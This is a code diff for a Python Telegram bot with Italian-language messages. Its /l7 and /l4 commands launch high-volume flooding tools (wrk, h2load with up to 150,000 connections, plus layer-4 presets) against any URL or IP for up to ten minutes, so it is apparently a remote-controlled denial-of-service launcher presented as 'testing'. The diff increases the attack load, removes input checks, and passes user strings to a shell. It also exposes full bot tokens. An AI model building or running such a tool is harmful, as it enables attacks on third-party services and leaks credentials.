@@ -11,7 +11,7 @@ from telegram.ext import Updater, CommandHandler
 import shutil
 
 # ================= CONFIG =================
-TOKEN = "8593144725:AAHw5UoWAnrANQCZIw1mwsbNkh8c_roFmLU"
+TOKEN = "8036771801:AAEZB4ekp5SmfhbU8CBzARuaP692AwWiiPM"
 AUTHORIZED_ID = 5699538596
 MAX_TIME = 600
 # =========================================
@@ -26,7 +26,7 @@ progress_message = None
 # ================= PRESET =================
 L7_PRESETS = {
     "basic": {"bin": "wrk", "flags": "-t30 -c100000 -d10m"},
-    "aggressive": {"bin": "h2load", "flags": "-n 10000 -c 100000 -t 30"}
+    "aggressive": {"bin": "h2load", "flags": "-n 150000 -c 150000 -t 30"}
 }
 
 L4_PRESETS = {
@@ -57,7 +57,7 @@ def progress_bar_loop(context, chat_id, duration):
             break
 
         percent = int((elapsed / duration) * 100)
-        blocks = int(percent / 5)  # 20 blocchi
+        blocks = int(percent / 5)
         bar = "█" * blocks + "░" * (20 - blocks)
 
         text = f"{LAST_DESC}\n[{bar}] {percent}% ⏱ {remaining}s rimanenti"
@@ -77,9 +77,9 @@ def start(update, context):
     update.message.reply_text(
         "🤖 Bot pronto.\n\n"
         "L7:\n"
-        "  /l7 url:method:tempo  (method: basic|aggressive, max 600s)\n"
+        "  /l7 url:method:tempo\n"
         "L4:\n"
-        "  /l4 ip:port:method:tempo  (method: default|fast, max 600s)\n\n"
+        "  /l4 ip:port:method:tempo\n\n"
         "/status – stato\n"
         "/stop – ferma test"
     )
@@ -87,6 +87,7 @@ def start(update, context):
 # ---------- L7 ----------
 def l7_command(update, context):
     global process, LAST_DESC, progress_thread, progress_stop_event, progress_message, is_running_flag
+
     if not is_authorized(update):
         return
     if is_running_flag:
@@ -96,19 +97,20 @@ def l7_command(update, context):
         update.message.reply_text("Uso: /l7 url:method:tempo")
         return
 
+    # ✅ FIX PARSING
     try:
-        url, method, tempo = context.args[0].split(":")
+        url, method, tempo = context.args[0].rsplit(":", 2)
     except ValueError:
         update.message.reply_text("Formato non valido")
         return
 
-    preset = L7_PRESETS.get(method.strip().lower())
+    preset = L7_PRESETS.get(method.lower())
     if not preset:
         update.message.reply_text("Preset L7 non valido")
         return
 
-    if not shutil.which(preset['bin']):
-        update.message.reply_text(f"Comando {preset['bin']} non trovato sul sistema!")
+    if not shutil.which(preset["bin"]):
+        update.message.reply_text(f"{preset['bin']} non trovato")
         return
 
     try:
@@ -117,7 +119,7 @@ def l7_command(update, context):
         update.message.reply_text("Tempo non valido")
         return
     if not (1 <= tempo <= MAX_TIME):
-        update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
+        update.message.reply_text("Tempo fuori range")
         return
 
     parsed = urlparse(url)
@@ -125,27 +127,25 @@ def l7_command(update, context):
         update.message.reply_text("URL non valido")
         return
 
-    # Costruzione comando L7 con URL corretto
     cmd_str = f"{preset['bin']} {preset['flags']} {url}"
-    print(f"Eseguo comando L7: {cmd_str}")  # debug
-
-    try:
-        process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
-    except Exception as e:
-        update.message.reply_text(f"Errore nell'avvio del comando: {e}")
-        return
+    process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
 
     LAST_DESC = f"L7 {method} → {url} : {tempo}s"
     is_running_flag = True
 
     progress_stop_event.clear()
-    progress_message = update.message.reply_text(f"⏳ Avvio test L7 ({tempo}s)...")
-    progress_thread = threading.Thread(target=progress_bar_loop, args=(context, update.effective_chat.id, tempo), daemon=True)
+    progress_message = update.message.reply_text("⏳ Avvio test L7...")
+    progress_thread = threading.Thread(
+        target=progress_bar_loop,
+        args=(context, update.effective_chat.id, tempo),
+        daemon=True
+    )
     progress_thread.start()
 
 # ---------- L4 ----------
 def l4_command(update, context):
     global process, LAST_DESC, progress_thread, progress_stop_event, progress_message, is_running_flag
+
     if not is_authorized(update):
         return
     if is_running_flag:
@@ -155,19 +155,20 @@ def l4_command(update, context):
         update.message.reply_text("Uso: /l4 ip:port:method:tempo")
         return
 
+    # ✅ FIX PARSING
     try:
-        ip, port, method, tempo = context.args[0].split(":")
+        ip, port, method, tempo = context.args[0].rsplit(":", 3)
     except ValueError:
         update.message.reply_text("Formato non valido")
         return
 
-    preset = L4_PRESETS.get(method.strip().lower())
+    preset = L4_PRESETS.get(method.lower())
     if not preset:
         update.message.reply_text("Preset L4 non valido")
         return
 
-    if not shutil.which(preset['cmd']):
-        update.message.reply_text(f"Comando {preset['cmd']} non trovato sul sistema!")
+    if not shutil.which(preset["cmd"]):
+        update.message.reply_text(f"{preset['cmd']} non trovato")
         return
 
     try:
@@ -175,34 +176,33 @@ def l4_command(update, context):
     except ValueError:
         update.message.reply_text("IP non valido")
         return
-    if not port.isdigit() or not (1 <= int(port) <= 65535):
+
+    if not port.isdigit():
         update.message.reply_text("Porta non valida")
         return
+
     try:
         tempo = int(tempo)
     except ValueError:
         update.message.reply_text("Tempo non valido")
         return
     if not (1 <= tempo <= MAX_TIME):
-        update.message.reply_text(f"Tempo fuori range 1-{MAX_TIME}s")
+        update.message.reply_text("Tempo fuori range")
         return
 
-    # CORRETTO: aggiungere IP alla fine del comando
     cmd_str = f"{preset['cmd']} {preset['args'].format(port=port)} {ip}"
-    print(f"Eseguo comando L4: {cmd_str}")  # debug
-
-    try:
-        process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
-    except Exception as e:
-        update.message.reply_text(f"Errore nell'avvio del comando: {e}")
-        return
+    process = subprocess.Popen(cmd_str, shell=True, preexec_fn=os.setsid)
 
     LAST_DESC = f"L4 {method} → {ip}:{port} : {tempo}s"
     is_running_flag = True
 
     progress_stop_event.clear()
-    progress_message = update.message.reply_text(f"⏳ Avvio test L4 ({tempo}s)...")
-    progress_thread = threading.Thread(target=progress_bar_loop, args=(context, update.effective_chat.id, tempo), daemon=True)
+    progress_message = update.message.reply_text("⏳ Avvio test L4...")
+    progress_thread = threading.Thread(
+        target=progress_bar_loop,
+        args=(context, update.effective_chat.id, tempo),
+        daemon=True
+    )
     progress_thread.start()
 
 # ---------- STOP ----------
@@ -212,7 +212,7 @@ def stop_command(update, context):
     if is_running_flag:
         progress_stop_event.set()
         kill_process()
-        update.message.reply_text("⛔ Test fermato manualmente")
+        update.message.reply_text("⛔ Test fermato")
     else:
         update.message.reply_text("ℹ️ Nessun test attivo")
 
@@ -221,7 +221,7 @@ def status_command(update, context):
     if not is_authorized(update):
         return
     if is_running_flag:
-        update.message.reply_text(f"🟢 Test attivo\n{LAST_DESC}")
+        update.message.reply_text(f"🟢 Attivo\n{LAST_DESC}")
     else:
         update.message.reply_text("🔴 Nessun test attivo")
 
